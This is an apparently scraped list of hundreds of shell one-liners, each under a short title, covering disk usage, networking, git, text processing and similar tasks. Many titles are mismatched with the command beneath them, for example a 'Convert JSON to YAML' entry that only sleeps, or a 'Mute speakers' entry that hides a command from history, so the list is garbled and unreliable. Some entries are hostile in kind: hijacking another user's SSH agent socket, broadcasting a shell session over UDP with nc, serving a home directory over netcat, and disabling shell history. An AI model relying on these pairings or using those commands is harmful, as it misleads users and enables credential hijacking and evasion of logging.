wcalc -q <<< '3/5'
# List the size (in human readable form) of all sub folders from the current location
du -hs *|sort -h
# Using Git, stage all manually deleted files.
for x in `git status | grep deleted | awk '{print $3}'`; do git rm $x; done
# An alarm clock using xmms2 and at
echo "xmms2 play" | at 6:00
# Post a message to another users screen via SSH
zenity --info --text "Your welcome! Lunch?" --display=:0
# diff the same file in two directories.
diff {$path1,$path2}/file_to_diff
# Remove a range of lines from a file
vi +START,ENDd +wq sample.txt
# Apply, in parallel, a bc expression to CSV
pbc () { parallel -C, -k -j100% "echo '$@' | bc -l"; }
# "Pretty print" $PATH, separate path per line
echo $PATH | tr -s ':' '\n'
# See system users
~<TAB>
# Reducing image size
convert example.png -resize 100x100! output.png
# Mute speakers after an hour
HISTFILE= ; your_secret_command
# tcpdump whole packets to file in ascii and hex with ip adresses instead of hostname
tcpdump host <IP> -nXXv -s0 -w file.pcap
# Find public IP when behind a random router (also see description)
gtar cpf - . | (cd /dest/directory; gtar xpf -)
# Rename duplicates from MusicBrainz Picard
for i in */*/*\(1\)*; do mv -f "$i" "${i/ (1)}"; done
# Kill a process by its partial name
pkill name
# Find out which process uses an old lib and needs a restart after a system update
lsof | grep 'DEL.*lib' | sort -k1,1 -u
# Cut the first 'N' characters of a line
cut -c 1-N
# Stop and continue processing on a terminal
CTRL+s
# tunnel vnc port
ssh -L 5900:localhost:5900 user@exampleserver.com
# List only locally modified files with CVS
du -sm $dirname
# Debug your makefile
make -d | egrep --color -i '(considering|older|newer|remake)'
# about how using internal separate field and store file content on variable
OIFS=$IFS;IFS=$':';for i in $(cat -n /etc/passwd);do echo -n $i\ ** \ ;done
# count match string lines from file(s)
unzip -p doc.odt content.xml | sed 's|<[^>]*>| |g' | wc -l
# Watch active calls on an Asterisk PBX
asterisk -rx "core show calls" | grep "active" | cut -d' ' -f1
# Find files changed between dates defined by ctime of two files specified by name
find . -cnewer <file a> -and ! -cnewer <file b>
# Mapreduce style processing
parallel -j 50 ssh {} "ls" ::: host1 host2 hostn | sort | uniq -c
# Convert from a decimal number to a binary number
echo 'ibase=10; obase=2; 127' | bc
# find only current directory (universal)
find . \( ! -name . -prune \) \( -type f -o -type l \)
# print contents of file from first match of regex to end of file
sed -n '/regex/,$p' filename
# print first n characters of any file in human readble form using hexdump
hexdump -C -n 20 filename
# quickly backup or copy a file with bash
cp filename{,.`date +%Y%m%d-%H%M%S`}
# Erase CD RW
dd if=/dev/zero of=testfile.txt bs=1M count=10
# script broadcast-pppoe-discover
nmap -T4 --script broadcast-pppoe-discover 192.168.122.0/24
# Get IP address from domain
nslookup www.example.com | tail -2 | head -1 | awk '{print $2}'
# Get ethX mac addresses
ip link | grep 'link/ether' | awk '{print $2}'
# Add line number count as C-style comments
awk '{printf("/* %02d */ %s\n", NR,$0)}' inputfile > outputfile
# switch case of a text file
python3 -c 'import sys; print(sys.stdin.read().swapcase(), end="")' <input.txt
# get newest jpg picture in a folder
cp `ls -x1tr *.jpg | tail -n 1` newest.jpg
# view certificate details
openssl x509 -in filename.crt -noout -text
# Cut the first 'N' characters of a line
cut -c -N
# Test I/O performance by timing the writing of 100Mb to disk
time dd if=/dev/zero of=dummy_file bs=512k count=200
# Check if the LHC has destroyed the world
ls -s | sort -nr | more
# Show CPU usage for EACH cores
ps ax -L -o pid,tid,psr,pcpu,args | sort -nr -k4| head -15 | cut -c 1-90
# Compute the numeric sum of a file
sed i"+" file.txt | xargs echo 0 |bc
# Download all images from a website in a single folder
zip -r /tmp/filename-`date +%Y%m%d_%H%M%S`.zip /directory/
# Display total Kb/Mb/Gb of a folder and each file
du -hc *
# Create a git alias that will pull and fast-forward the current branch if there are no conflicts
git config --global --add alias.ff "pull --no-commit -v" ; git ff
# Listen to a file
while true; do cat /usr/src/linux/kernel/signal.c > /dev/dsp; done
# AES file encryption with openssl
openssl aes-256-cbc -salt -in secrets.txt -out secrets.txt.enc
# convert unixtime to human-readable
date -r 1390196676
# get header and footer of file for use with scalpel file carving
xxd -l 0x04 $file; xxd -s -0x04 $file
# Broadcast your shell thru UDP on port 5000
script -qf >(nc -ub 192.168.1.255 5000)
# Remove all zero size files from current directory (not recursive)
rm *(L0)
# Show highlighted text with full terminal width
printf "\e[7m%-`tput cols`s\e[0m\n" "Full width highlighted line"
# Delete leading whitespace from the start of each line
sed 's/^[ \t]*//' input.txt
# Rescan partitions on a SCSI device
echo "w" | fdisk /dev/sdb
# Apply an xdelta patch to a file
xdelta -d -s original_file delta_patch patched_file
# Find default gateway
netstat -rn | grep UG | tr -s " " | cut -d" " -f2
# Perpetual calendar
date --date="90 days ago"
# Resets a terminal that has been messed up by binary input
reset
# Join the content of a bash array with commas
printf -- " -e %s" ${ARRAY[*]}
# find xargs mv
find . -iname "*.mp4" -print0 | xargs -0 mv --verbose -t /media/backup/
# Delete newline
tr -d "\n" < file1 > file2
# Picture Renamer
exiv2 rename *.jpg
# Build an exhaustive list of maildir folders for mutt
find ~/Maildir/ -mindepth 1 -type d | egrep -v '/cur$|/tmp$|/new$' | xargs
# Bash: escape '-' character in filename
mv ./-filename filename
# Calculate sum of N numbers (Thanks to flatcap)
seq 100000 | paste -sd+ | bc
# Convert JSON to YAML
sleep 10 & wait $!
# Convert flv without re-encoding
unalias ls
# list all crontabs for users
cut -d: -f1 /etc/passwd | grep -vE "#" | xargs -i{} crontab -u {} -l
# Check variable has been set
[ -z "$VAR" ] && echo "VAR has not been set" && exit 1
# ptree equivalent in HP-UX
UNIX95=1 ps -eHf
# Calculate N!
seq 10 | paste -sd* | bc
# Generate a quick, lengthy password
head /dev/urandom | md5sum | base64
# Validating a file with checksum
echo 'c84fa6b830e38ee8a551df61172d53d7  myfile' | md5sum -c
# Delete leading whitespace from the start of each line
sed 's/^\s*//' input.txt
# copy root to new device
mount /dev/root /mnt/root; rsync -avHX /mnt/root/ /mnt/target/
# get rid of lines with non ascii characters
grep -v $'[^\t\r -~]' my-file-with-non-ascii-characters
# extract email addresses from some file (or any other pattern)
grep -Eio '([[:alnum:]_.-]{1,64}@[[:alnum:]_.-]{1,252}?\.[[:alpha:].]{2,6})'
# Copy a file and force owner/group/mode
install -o user -g group -m 755 /path/to/file /path/to/dir/
# find large files
find . -type f -size +1100000k |xargs -I% du -sh %
# find the delete file ,which is in use
lsof -n |grep delete
# leave a stale ssh session
<ENTER>~.
# Find top 10 largest files
du -a /var | sort -n -r | head -n 10
# convert uppercase filenames in current directory to lowercase
for x in *;do mv "$x" "`echo $x|tr [A-Z] [a-z]`";done
# Delete a file/directory walking subdirectories (bash4 or zsh)
shopt -s globstar ; rm -f **/cscope.out
# Which files/dirs waste my disk space
du -Sh | sort -h | tail
# Fill up disk space (for testing)
tail $0 >> $0
# memory usage
ps -e -orss=,args= | sort -b -k1,1n | pr -TW$COLUMNS
# extract email adresses from some file (or any other pattern)
grep -aEio '([[:alnum:]_.-\+\-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})'
# for ssh uptime
mussh -h 192.168.100.{1..50} -m -t 10 -c uptime
# Fix borked character coding in a tty.
LC_ALL=C man -c man
# Create a bash script from last n commands
history | tail -(n+1) | head -(n) | sed 's/^[0-9 ]\{7\}//' >> ~/script.sh
# Show linux kernel modules dependencies
modprobe --show-depends module_name
# run last command with root
sudo !!
# Show a file in less without wrapping long lines
less -S somefile
# diff 2 remote files
diff <(ssh user@host1 cat /path/to/file) <(ssh user@host2 cat /path/to/file2)
# lotto generator
seq -w 50 | sort -R | head -6 |fmt|tr " " "-"
# Clear current session history (bash)
history -c
# Watch the disk fill up with change highlighting
watch -d -n 5 df
# Disable system bell in an X session
:r! echo %
# How to speedup the Ethernet device
sudo ethtool -s eth0 speed 100 duplex full
# Mount file system using back-up superblock
mount -o sb=98304 /dev/sda5 /mnt/data5
# Recursively replace a string in files with lines matching string
find . -type f |xargs -I% sed -i '/group name/s/>/ deleteMissing="true">/' %
# convert chinese character into wubi86 input code
echo Your_Chinese_Char | uniconv -encode Chinese-WB
# Toggle between directories
cd -
# Recursive Ownership Change
chown -cR --from=olduser:oldgroup newuser:newgroup *
# Incase you miss the famous 'C:\>' prompt
export PS1='C:${PWD//\//\\\}>'
# Check SATA link speed.
dmesg | grep -i sata | grep 'link up'
# Convert JSON to YAML
sed 's/:/\n/g' <<<$PATH
# Salvage a borked terminal
echo <ctrl+v><ctrl+o><enter>
# Remove a range of lines from a file
sed -i <start>,<end>d <filename>
# Use a var with more text only if it exists
command ${MYVAR:+--someoption=$MYVAR}
# Fetch the Gateway Ip Address
netstat -nr | awk 'BEGIN {while ($3!="0.0.0.0") getline; print $2}'
# Get IP from host
getent hosts positon.org | cut -d' ' -f1
# Create a tar file with the current date in the name.
tar cfz backup-`date +%F`.tgz somedirs
# sleep for 1/10s or 1/100s or even 1/1000000s
time usleep 100000
# Simple MAC Changeing
ifconfig wlan0 hw ether 00:11:22:33:44:55
# Get own public IP address
\[command]
# du command without showing other mounted file systems
du -h --max-depth=1 --one-file-system /
# list all file extensions in a directory
find /path/to/dir -type f | grep -o '\.[^./]*$' | sort | uniq
# Displays the version of the Adobe Flash plugin installed
strings /usr/lib/flashplugin-nonfree/libflashplayer.so |grep ^LNX
# Show total disk space on all partitions
df -h --total | awk 'NR==1; END{print}'
# Monitor all DNS queries seen by the local machine
dnstop -l 3 enp1s0f0
# Sorts and compare 2 files line by line
comm -12 <(sort -u File1) <(sort -u File2)
# worse alternative to <ctrl+r>
function memo() { awk '! seen[$0]++' <<< $(grep -i "$@" ~/.bash_history ); }
# Remove all files but one starting with a letter(s)
rm -rf [a-bd-zA-Z0-9]* c[b-zA-Z0-9]*
# Download streaming video in mms
mimms  mms://Your_url.wmv
# Run a command, redirecting output to a file, then edit the file with vim.
vimcmd() { $1 > $2 && vim $2; }
# Copy one file to multiple files
tee < file.org file.copy1 file.copy2 [file.copyn] > /dev/null
# See entire packet payload using tcpdump.
tcpdump -nnvvXSs 1514 -i <device> <filters>
# convert a,b,c to ('a','b','c') for use in SQL in-clauses
echo a,b,c  | sed -e s/,/\',\'/g  -e s/^/\(\'/ -e s/$/\'\)/
# Monitoring sessions that arrive at your server
watch -n 1 -d "finger"
# list all file extensions in a directory
find /path/to/dir -type f -name '*.*' | sed 's@.*/.*\.@.@' | sort | uniq
# ANSI Terminal Color Test using python
colortest-python
# Get IP address from domain
dig +short <domain>
# Type strait into a file from the terminal.
cat /dev/tty > FILE
# Zip each file in a directory individually with the original file name
ls -1 | awk ' { print "zip "$1".zip " $1 } ' | sh
# whois filtering the important information
whois commandlinefu.com | grep -E '^\s{3}'
# Squish repeated delimiters into one
echo "hello::::there" | tr -s ':'
# generate a random 10 character password
pwgen 10   # generate a table of 10 character random passwords
# Run the last command as root
sudo !-1
# Assign function keys to your frequent commands
bind '"<ctrl+v><functionKey>":"command\n"'
# Prevent an IPv6 address on an interface from being used as source address of packets.
ip addr change 2001:db8:1:2::ab dev eth0 preferred_lft 0
# sync two folders except hidden files
rsync -vau --exclude='.*' SOURCE-PATH/myfold TARGET-PATH
# check open ports (both ipv4 and ipv6)
netstat -plntu
# kill a process(e.g. conky) by its name, useful when debugging conky:)
kill `pidof conky`
# SSH Copy ed25519 key into your host
ssh-copy-id -i your-ed25519-key user@host
# Generate random IP addresses
nmap -n -iR 0 -sL | cut -d" " -f 2
# One liner to kill a process when knowing only the port where the process is running
kill -9 `lsof -t -i :port_number`
# Calculate N!
echo $(($(seq -s* 10)))
# Shuffle mp3 files in current folder and play them.
echo /home/foo/dir1/bar |  awk -F/ -v OFS=/ '{$3 = "dir2"}1'
# Ping xxx.xxx.xxx.xxx ip 100000 times with size 1024bytes
ping xxx.xxx.xxx.xxx size 1024 repeat 100000
# VIM: when Ctrl-D and Ctrl-U only scroll one line, reset to default
:set scroll=0
# tcpdump from src to dst
tcpdump src <srcIP>  and dst <dstIP> -w file.pcap
# Find broken symlinks and delete them
find -L /path/to/check -type l | xargs rm
# Recursively chmod all dirs to 755 and all files to 644
function fixperms() { chmod -R a=r,u+w,a+X . }
# copy partition table from /dev/sda to /dev/sdb
sfdisk -d /dev/sda | sfdisk /dev/sdb
# Use find to get around Argument list too long problem
find . -name 'junkfiles-*' -print0 | xargs -0 rm
# File browser
alias echourl="wget -qO -"
# find matching wholename example
find -wholename "*/query/*.json"
# Another way to see the network interfaces
ip addr show
# Suppress output of loud commands you don't want to hear from
function quietly () { $* 2> /dev/null > /dev/null; };
# Get the size of all the directories in current directory (Sorted Human Readable)
du -h | sort -hr
# Watch active calls on an Asterisk PBX
/usr/sbin/asterisk -rx 'core show channels' | grep -m1 "call" | cut -d' ' -f1
# du and sort to find the biggest directories in defined filesystem
for i in G M K; do du -hx /var/ | grep [0-9]$i | sort -nr -k 1; done | less
# download specific files only from a website
cp -r path/to/file/tree $(mkdir -p new/path/here; echo new/path/here)
# Open in TextMate Sidebar files (recursively) with names matching REGEX_A and not matching REGEX_B
mate - `find * -type f -regex 'REGEX_A' | grep -v -E 'REGEX_B'`
# put current directory in LAN quickly
python3 -m http.server
# [git] Output remote origin from within a local repository
git config --local --get remote.origin.url
# rsync...
rsync -avz -e ssh user@host:/srcpath destpath
# generate a random 10 character password
pwgen -B -y 10
# flush memcached via netcat
echo 'flush_all' | nc localhost 11211 -i1 <<< 'quit'
# Get a qrcode for a given string
pkill -0 prog1; while [ $? -eq 0 ]; do sleep 10; pkill -0 prog1; done; prog2
# Include a remote file (in vim)
:r scp://yourhost//your/file
# Print the IPv4 address of a given interface
ip addr show enp3s0 | awk '/inet[^6]/{print $2}' | awk -F'/' '{print $1}'
# Poor man's ntpdate
date -s "`curl -sI www.example.com | sed -n 's/^Date: //p'`"
# Batch rename extension of all files in a folder, in the example from .txt to .md
rename 's/\.txt$/\.md$/i' *
# Uptime in minute
bc <<<  `uptime | sed -e 's/^.*up //' -e 's/[^0-9:].*//' | sed 's/:/*60+/g'`
# Symlink all files from a base directory to a target directory
ln -s /base/* /target && ls -l /target
# Grep inside Vim and navigate results
:vimgrep pattern %
# Like top but for files
watch -d -n 2 'df; ls -FlAt;'
# Delete all but the latest 5 files, ignoring directories
ls -lt|grep ^-|awk 'NR>5 { print $8 }'|xargs -r rm
# VIM: Go back to the last place you were in a document
''
# What is my ip?
curl -I <IPaddress>
# change user & preserver environment (.bashrc&co)
su - -m -p git
# Clone or rescue a block device
ddrescue -v /dev/sda /dev/sdb logfile.log
# Close specify detached screen
screen -X -S [sessionname] quit
# HDD Performance Write Test
dd if=/dev/zero of=10gb bs=1M count=10240
# view http traffic
tcpdump -i eth0  port 80 -w -
# Partition a sequence of disk drives for LVM with fdisk
for x in {a..d}; do echo -e "n\np\n\n\n\nt\n8e\nw\n" | fdisk /dev/sd"$x"; done
# use jq to validate and pretty-print json output
cat file.json | jq
# convert mp3 into mb4 (audiobook format)
export GREP_OPTIONS='--color=auto'
# Time conversion/format using the date command
date -d '2011-12-15 05:47:09' +"epoch: %s or format: %Y/%m/%d"
# save stderr only to a file
command 3>&1 1>&2 2>&3 | tee file
# Find how far nested you are in subshells
echo "I am $BASH_SUBSHELL levels nested";
# exim statistics about mails from queue
exim -bp | exiqsumm -c
# Makefile argument passing
make [target] VAR=foobar
# Generate list of words and their frequencies in a text file.
tr A-Z a-z | tr -d "[[:punct:]][[:digit:]]" | tr ' /_' '\n' | sort | uniq -c
# auto complete arguments
ls --[TAB][TAB]
# list with full path
ls -d $PWD/*
# Nice beep
jq < file.json
# Webcam view with vlc
cvlc v4l2:// &
# Redirect bash built-in output to stdout
TIME=$( { time YOUR_COMMAND_HERE; } 2>&1 ) ; echo $TIME
# Generate an XKCD #936 style 4 word passphrase (fast)
echo $(shuf -n4 /usr/share/dict/words)
# list txt files order by time
ls -lt --time=atime *.txt
# Screenshot Directly To Clipboard
[[ -d dir ]] || mkdir dir ; cd dir
# remove the last of all html files in a directory
for f in *.html; do sed '$d' -i "$f"; done
# Record active input of soundcard to file.wav
rec -c 2 -r 44100 -s -t wav file.wav
# Output entire line once per unique value of the first column
awk '!array[$1]++' file.txt
# List files older than one year, exluding those in the .snapshot directory
find /path/to/directory -not \( -name .snapshot -prune \) -type f -mtime +365
# Skype conversation logs to IRC-format logs
grep -o -h -rE '".*"' * | ispell -l -p ~/mydict | sort -u
# Sum file sizes
expr `find . -type f -printf "%s + "0`
# Get memory total from /proc/meminfo in Gigs
awk '( $1 == "MemTotal:" ) { print $2/1048576 }' /proc/meminfo
# encrypt whole line with ROT13 in vim
g?g?
# Gets the X11 Screen resolution
/usr/dt/bin/dtconfig -d
# Analyze awk fields
tr " " "\n" | nl
# list with full path
ls -d1 $PWD/{.*,*}
# Minimize active window
xdotool windowminimize $(xdotool getactivewindow)
# open remote desktop connection without X
xvfb-run --server-num=1 rdesktop -u name -p pass -g 1024x768 192.168.0.1
# Ride another SSH agent
export SSH_AUTH_SOCK=`find /tmp/ssh* -type s -user [user] -mtime -1 | head -1`
# Get size of terminal
alias termsize='echo $COLUMNS x $LINES'
# Find out my Linux distribution name and version
cat /etc/*-release
# Kill all processes belonging to a user
ps -fu $USER | awk {'print $2'} | xargs kill [-9]
# Delete All Objects From An S3 Bucket Using S3cmd
dd if=/dev/sda of=/home/sam/MBR.image bs=512 count=1
# list all file extensions in a directory
ls | grep -Eo "\..+" | sort -u
# convert ascii string to hex
xxd -p <<< <STRING>
# share internet connection with only one network interface
ifconfig eth0:1 192.168.0.1/24
# Generic shell function for modifying files in-place
inplace() { eval F=\"\$$#\"; "$@" > "$F".new && mv -f "$F".new "$F"; }
# Count TCP States From Netstat
netstat -an | awk '/tcp/ {print $6}' | sort | uniq -c
# tar a directory and send it to netcat
tar cfvz - /home/user | netcat -l -p 10000
# Convert a string to
python -c "print 'this is a test'.title()"
# Load your [git-controlled] working files into the vi arglist.
vim $(git diff origin/master --name-only)
# Get MX records for a domain
host -t mx foo.org
# bash or tcsh redirect both to stdout and to a file
echo "Hello World." | tee -a hello.txt
# List the Sizes of Folders and Directories
du -h --max-depth=1 /path/folder/
# MoscowML with editable input-line and history
rlwrap mosml
# Get first Git commit hash
git log --pretty=format:%H | tail -1
# List only locally modified files with CVS
grep -lir "sometext" * > sometext_found_in.log
# converting vertical line to horizontal line
tr '\n' '\t' < inputfile
# Quick find function
quickfind () { find . -maxdepth 2 -iname "*$1*" }
# Replace spaces in a file with hyphens
sed -i 's/ /-/g' *
# find files beginning with filename* that do not include "string"
grep -L "string" filename*
# Changes a User Password via command line without promt
echo -e "new_password\nnew_password" | (passwd --stdin $USER)
# Get all IPs via ifconfig
ifconfig | awk -F':| +'  '/ddr:/{print $4}'
# Change wallpaper
feh --bg-scale /path/to/wallpaper.jpg
# list files recursively by size
stat -c'%s %n' **/* | sort -n
# Customer Friendly free
free -ht --si
# dont log current session to history
unset HISTFILE
# Edit the /etc/sudoers config file the right way.
visudo
# Get max number of arguments
getconf ARG_MAX
# Change the console keyboard layout
loadkeys uk
# Retry the previous command until it exits successfully
until !!; do done
# Take a file as input (two columns data format) and sum values on the 2nd column for all lines that have the same value in 1st column
awk '{a[$1] += $2} END { for (i in a) {print i " " a[i]}}' /path/to/file
# delete PBS jobs based on strings from qstat output
qstat | awk '$6 ~ "STRING" {cmd="qdel " $1; system(cmd); close(cmd)}'
# apt-get upgrade with bandwidth limit
trickle sudo apt-get update -y
# Function to split a string into an array
Split()	{ eval "$1=( \"$(echo "${!1}" | sed "s/$2/\" \"/g")\" )"; }
# tar+pbzip2 a dir
tar -c directory_to_compress/ | pbzip2 -vc > myfile.tar.bz2
# Count git commits since specific commit
git log --pretty=oneline b56b83.. | wc -l
# Replace strings in text
sed -e 's/dapper/edgy/g' -i /etc/apt/sources.list
# GZip all files in a directory separately
for file in *.foo; do gzip "$file"; done
# Use curl with a local SOCKS5 proxy (e.g. Tor)
turl(){ curl --socks5-hostname localhost:9050 $@ ; }
# list services running (as root)
service --status-all | grep running
# GZip all files in a directory separately
ls | xargs -n1 gzip
# Download an Entire website with wget
echo 'magic(3)' | matlab -nodisplay
# Gets directory and files tree listing from a FTP-server
json2yaml ./example.json > ./example.yml
# add a backup (or any other) suffix to a file
mv -vi file{,~}
# get detailed info about a lan card on HP-UX 11.31
nwmgr -q info -c lan0
# List the Sizes of Folders and Directories
du -hs /path/to/folder/*
# Git fetch all remote branches
git branch -r | awk -F'/' '{print "git fetch "$1,$2}' | xargs -I {} sh -c {}
# Number of CPU's in a system
grep -c ^processor /proc/cpuinfo
# Ring the system bell after finishing a long script/compile
myLongScript && echo -e '\a' || (echo -e '\a'; sleep 1; echo -e '\a')
# Compress a file or directory keeping the owner and permissions
tar -jcvf /folder/file.tar.bz2 --same-owner --same-permissions /folder/
# Execute a command before display the bash prompt
PROMPT_COMMAND=command
# Get listening ports on a localhost
ss -ln | awk '$3~/([0-9]+)/{print $3}' | sed 's/.*\:\([0-9]\+\)$/\1/'
# Add the time to BASH prompt
export PS1="(\@) $PS1"
# print a file on a single line
echo $(cat file)
# output absolute path of the present working directory
/bin/pwd -P
# Generate a list of items from a couple of items lists A and B, getting (B - A ) set
grep -vxFf ItemsListtoAvoid.txt AllItemsList.txt > ItemsDifference.txt
# Recursive replace of directory and file names in the current directory.
for i in `find -name '*oldname*'`; do "mv $i ${i/oldname/newname/}"; done
# List users with running processes
ps aux | sed -n '/USER/!s/\([^ ]\) .*/\1/p' | sort -u
# Print process run time, average CPU usage, and maximum memory usage on exit
/usr/bin/time -f "\ntime\t%E\nCPU\t%P\nRAM\t%Mk" <command>
# find directory with most inodes/files
find / -xdev -printf '%h\n' | sort | uniq -c | sort -k 1 -n | tail
# Pipe a textfile to vim and move the cursor to a certain line
zcat /usr/share/doc/vim-common/README.gz | vim -g +23 -
# List all files in current dir and subdirs sorted by size
tree -ifs --noreport .|sort -n -k2
# bulk rename files with sed, one-liner
for i in *; do mv $i $(echo $i | sed 's/foo/bar/'); done
# Show current network interface in use
ip addr | awk '/state UP/ {print $2}' | sed 's/.$//'
# Use vi commands to edit your command lines
set -o vi; ls -l jnuk<ESC>bCjunk
# Create a directory and go inside it
mkdir dir; cd $_
# Print one . instead of each line
alias ...='while read line; do echo -n "."; done && echo ""'
# Alias for quick command-line volume set (works also remotely via SSH)
alias setvol='aumix -v'
# Sort a character string
echo sortmeplease | grep -o . | sort | tr -d '\n'; echo
# How to check network connection from one interface
ping -I eth0 www.yahoo.com
# export iPad App list to txt file
ls "~/Music/iTunes/iTunes Media/Mobile Applications" > filepath
# psgrepp
ps aux | grep $(echo $1 | sed "s/^\(.\)/[\1]/g")
# Cut/Copy brackets or parentheses on vim (in normal mode)
d + %
# BourneShell: Go to previous directory
cd -
# Best option set for 7zip compression of database dumps or generic text files
7zr a -mx=9 -ms=on -mhc=on -mtc=off db_backup.sql.7z db_dump.sql
# Encode a string using ROT47
echo "your string here" | tr '\!-~' 'P-~\!-O'
# Filter the output of a file continously using tail and grep
ls -l | grep ^d
# Copy all files. All normal files, all hidden files and all files starting with - (minus).
cp ./* .[!.]* ..?* /path/to/dir
# count how many cat processes are running
ps -a | grep -c cat
# First file editor for newbies
cat > file.txt << EOF
# Apply fade effect to a audio
$ cat /etc/*-release
# Combine two mp3's or more into 1 long mp3
cat 1.mp3 2.mp3 > combined.mp3
# Last month
LASTMONTH=`date -d "last month" +%B`
# Print the IPv4 address of a given interface
ip a s eth0 | sed -nr 's!.*inet ([^/]+)/.*!\1!p'
# Count items in JSON array
echo '[1,2,3]' | jq '. | length'
# Sort lines on clipboard
ps aux | awk '{print $2, $4, $11}' | sort -k2rn | head -n 10
# Perform a C-style loop in Bash.
for (( i = 0; i < 100; i++ )); do echo "$i"; done
# Send remote command output to your local clipboard
command | ssh myHost xsel -i --display :0
# Using parcellite, indents the content of the clipboard manager
parcellite -c | sed 's/^/    /' | parcellite
# Read Python logs with tracebacks in color
while read i; do [ ${#i} -gt 72 ] && echo "$i"; done < /path/to/file
# Find your graphics chipset
lspci |grep VGA
# gpg decrypt several files
gpg --allow-multiple-messages --decrypt-files *
# Delete specific remote 'origin' branch 'gh-pages'
git push origin :gh-pages
# Compose 2 images to 1
composite -geometry 96x96+250+70 foreground.jpg background.jpg image.jpg
# Cut/Copy everything arround brackets or parentheses on vim (in normal mode)
d%
# Alias for lazy tmux create/reattach
tmux new-session -A
# Compress files in a directory
ls -ld **/*(/^F)
# Resume a partially copied file
rsync -a --append source-file destination
# Show available conversions
recode -l |less
# disable history for current shell session
HISTFILE=/dev/null
# converts a directory full of source tarballs into a bzr repository so you can compare different versions easily
bzr init .;for file in `ls *.bz2`; do bzr import $file; bzr ci -m $file; done
# Equivalent to ifconfig -a in HPUX
for i in `lanscan -i | awk '{print $1}'` ; do ifconfig $i ; done 2> /dev/null
# download the contents of a remote folder in the current local folder
watch "cat `ls -rcA1 | tail -n1`"
# Use tcpdump to monitor all DNS queries and responses
sudo tcpdump -i en0 'udp port 53'
# ssh X tunneling over multiple ssh hosts (through ssh proxy)
ssh -t -X -A user@sshproxy ssh -X -A user@sshhost
# Count lines of source code excluding blank lines and comments
sloccount <directory>
# return a titlecased version of the string[str.title() in python]
title() { sed 's/\<\w*/\u&/g' <<<$@; }
# This allows you to find a string on a set of files recursivly
grep -rF --include='*.txt' stringYouLookFor *
# display emerge.log date in a human friendly way
tail /var/log/emerge.log | awk -F: '{print strftime("%Y%m%d %X %Z", $1),$2}'
# print a python-script (or any other code) with syntax-highlighting and no loss of indentation
a2ps -R --columns=1 -M A4 myprog.py -o - |lpr
# Count all the files in the directory and child directories
ls -d */* | wc -l
# Create iso image of cd/dvd
dd if=/dev/cdrom of=~/cdimage.iso
# Quickly create an alias for changing into the current directory
function map() { [ -n "$1" ] && alias $1="cd `pwd`" || alias | grep "'cd "; }
# Remove Suspend option from XFCE logoff dialog
xfconf-query -c xfce4-session -np '/shutdown/ShowSuspend' -t 'bool' -s 'false'
# Batch Convert SVG to PNG
for i in *.svg; do convert "$i" "${i%.svg}.png"; done
# Change host name
sed -i 's/oldname/newname/' /etc/hosts /etc/hostname
# find out zombie process
ps aux | awk '{ print $8 " " $2 " " $11}' | grep -w Z
# Send a local file via email
echo "see attached file" | mail -a filename -s "subject" email@address
# Summarize the number of open TCP connections by state
netstat -nt | awk '{print $6}' | sort | uniq -c | sort -n -k 1 -r
# Create tar over SSH
tar cvzf - /folder/ | ssh root@192.168.0.1 "dd of=/dest/folder/file.tar.gz"
# ls -qahlSr    # list all files in size order - largest last
ls -qahlSr    # list all files in size order - largest last
# Clear terminal Screen
clear
# ps grep with header
psg () { ps auxwww | egrep "$1|PID" | grep -v grep }
# Display formatted routes
routel
# most used unix commands
awk '{print $1}' ~/.bash_history | sort | uniq -c | sort -rn | head -n 10
# Access partitions inside a LVM volume
kpartx -a /dev/mapper/space-foobar
# split a file by a specific number of lines
csplit -k my_file 500 {*}
# Clean all .pyc files from current project. It cleans all the files recursively.
find . -type f -name "*.pyc" -delete;
# Less a grep result, going directly to the first match in the first file
argv=("$@"); rest=${argv[@]:1}; less -JMN +"/$1" `grep -l $1 $rest`
# List Threads by Pid along with Thread Start Time
ps -o pid,lwp,lstart --pid 797 -L
# Find out when your billion-second anniversary is (was).
date -d12/31/1970+1000000000sec
# Remove all but One
rm-but() { ls -Q | grep -v "$1" | xargs rm -r ; }
# awk change field separator
awk '$1=$1' FS=" " OFS=":" file
# grep for minus (-) sign
grep -- -
# Grab mp3 files from your favorite netcasts, mp3blog, or sites that often have good mp3s
wget -r -l1 -H -t1 -nd -N -np -A.mp3 -erobots=off -i ~/sourceurls.txt
# calulate established tcp connection of local machine
netstat -an | grep -Ec '^tcp.+ESTABLISHED$'
# Get information on your graphics card on linux (such as graphics memory size)
lspci -v -s `lspci | awk '/VGA/{print $1}'`
# List all available python modules
python -c "help('modules')"
# List of computers not logged into in more than four weeks
dsquery computer -name COMPUTERNAME -inactive 4
# Send test prints to networked printer.
echo "test" | lp -d $PRINTER
# View an info page on a nice interface
yelp info:foo
# get the ascii number with bash builtin printf
printf "%d\n" "'A" "'B"
# shutdown pc in 4 hours without needing to keep terminal open / user logged in.
shutdown 60*4 & disown
# For finding out if something is listening on a port and if so what the daemon is.
sockstat -4l
# To get the CPU temperature continuously on the desktop
while sleep 1; do acpi -t | osd_cat -p bottom; done &
# yum -q list updates | tail -n+2
List upgrade-able packages on Redhat
# Test your bash skills.
ssh bandit0@bandit.labs.overthewire.org -p 2220
# Find out when your billion-second anniversary is (was).
date -j -v +1000000000S -f %m%d%Y mmddYYYY
# Get decimal ascii code from character
echo -n a | od -d | sed -n "s/^.* //gp"
# Easily decode unix-time (funtion)
utime(){ date -d "1970-01-01 GMT $1 seconds"; }
# find the biggest file in current folder
ls -S|head -1find
# download a list of urls
cat urls.txt | wget -i- -T 10 -t 3 --waitretry 1
# Function to create an alias on the fly
mkalias () { echo "alias $1=\"$2\"" >> ~\.bash_aliases }
# sort a JSON blob
cat foo.json | python -mjson.tool
# Get own public IP address
for ((i=1; i<=99; ++i)); do echo $i; done
# txt2html
recode ..HTML < file.txt > file.html
# rotate the compiz cube via command line
convert  -background none -pointsize 55  label:"`whoami`" me.png
# Print the current time on the whole screen, updated every second
while(true); do printf "%s\f" $(date +%T); sleep 1; done  | sm -
# remove accented chars
iconv -f utf8 -t ascii//TRANSLIT <output-file>
# Print a list of all hardlinks in the working directory, recursively
find . -type f -a \! -links 1
# Throttling Bandwidth On A Mac
sudo ipfw pipe 1 config bw 50KByte/s;sudo ipfw add 1 pipe 1 src-port 80
# Access to specific man page section
man 5 crontab
# Testing hard disk writing  speed
time dd if=/dev/zero of=TEST bs=4k count=512000
# Get MD5 checksum from a pipe stream and do not alter it
cat somefile | tee >(openssl md5 > sum.md5) | bzip2 > somefile.bz2
# clear the X clipboard
xsel -bc
# Convert ascii string to hex
echo "text" | hd
